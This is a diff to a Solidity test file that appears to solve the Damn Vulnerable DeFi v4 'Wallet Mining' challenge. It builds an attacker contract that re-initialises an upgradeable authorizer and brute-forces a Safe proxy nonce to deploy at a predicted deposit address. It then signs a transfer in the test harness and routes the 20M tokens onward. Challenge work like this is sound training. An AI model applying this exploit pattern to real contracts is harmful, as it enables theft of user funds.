@@ -1,4 +1,4 @@
-    // SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
@@ -35,8 +35,7 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
-
-contract WalletAttacker {
+contract WalletAttacker is Test{
     DamnValuableToken token;
     AuthorizerUpgradeable authorizer;
     WalletDeployer walletDeployer;
@@ -45,13 +44,15 @@ contract WalletAttacker {
 
     address constant USER_DEPOSIT_ADDRESS =
         0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
+
 
     constructor(
         AuthorizerUpgradeable _authorizer,
         DamnValuableToken _token,
         WalletDeployer _walletDeployer,
         SafeProxyFactory _proxyFactory,
-        Safe _singletonCopy,
+        Safe _singletonCopy
     ) {
         authorizer = _authorizer;
         token = _token;
@@ -60,17 +61,57 @@ contract WalletAttacker {
         singletonCopy = _singletonCopy;
     }
 
-    function attack(address player, address user) external {
+    function attack(address ward, address user, uint256 userPrivateKey) external {
         address[] memory newWards = new address[](1);
-        newWards[0] = player;
+        newWards[0] = address(this);
         address[] memory newAims = new address[](1);
         newAims[0] = USER_DEPOSIT_ADDRESS;
 
         AuthorizerUpgradeable(address(authorizer)).init(newWards, newAims);
-        findNonce(user);
+        (uint256 user_nonce, bytes memory initializer) = findNonce(user);
+        console.log(user_nonce); // 13
+
+        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, user_nonce);
+
+        bytes memory transferData = abi.encodeWithSelector(
+            token.transfer.selector,
+            user,
+            DEPOSIT_TOKEN_AMOUNT
+        );
+
+        bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
+            address(token),
+            0,
+            transferData,
+            Enum.Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            address(0),
+            Safe(payable(USER_DEPOSIT_ADDRESS)).nonce()
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+            address(token),
+            0,
+            transferData,
+            Enum.Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            signature
+        );
+
+            token.transfer(ward, token.balanceOf(address(this)));
     }
 
-    function findNonce(address _user) internal {
+    function findNonce(address _user) internal returns (uint256, bytes memory) {
         bytes memory deploymentData = abi.encodePacked(
             proxyFactory.proxyCreationCode(), // type(SafeProxy).creationCode
             uint256(uint160(address(singletonCopy))) // _singleton cast to uint256
@@ -79,18 +120,18 @@ contract WalletAttacker {
         bytes32 deploymentHash = keccak256(deploymentData);
 
         address[] memory owners = new address[](1);
-        owners[0] = user; // the wallet owner
+        owners[0] = _user;
 
         bytes memory initializer = abi.encodeWithSelector(
             Safe.setup.selector,
-            owners,        // _owners
-            1,             // _threshold — 1 of 1
-            address(0),    // to — no delegatecall during setup
-            "",            // data — empty
-            address(0),    // fallbackHandler
-            address(0),    // paymentToken
-            0,             // payment
-            address(0)     // paymentReceiver
+            owners, // _owners
+            1, // _threshold — 1 of 1
+            address(0), // to — no delegatecall during setup
+            "", // data — empty
+            address(0), // fallbackHandler
+            address(0), // paymentToken
+            0, // payment
+            address(0) // paymentReceiver
         );
 
         for (uint256 nonce = 0; nonce < 1000; nonce++) {
@@ -114,8 +155,7 @@ contract WalletAttacker {
             );
 
             if (predicted == USER_DEPOSIT_ADDRESS) {
-                console.log(USER_DEPOSIT_ADDRESS);
-                break;
+                return (nonce, initializer);
             }
         }
     }
@@ -289,10 +329,9 @@ contract WalletMiningChallenge is Test {
             DamnValuableToken(token),
             WalletDeployer(walletDeployer),
             SafeProxyFactory(proxyFactory),
-            Safe(singletonCopy),
-            address(deployer)
+            Safe(singletonCopy)
         );
-        attacker.attack(address(player),address(user));
+        attacker.attack(address(ward), address(user),userPrivateKey);
     }
 
     /**
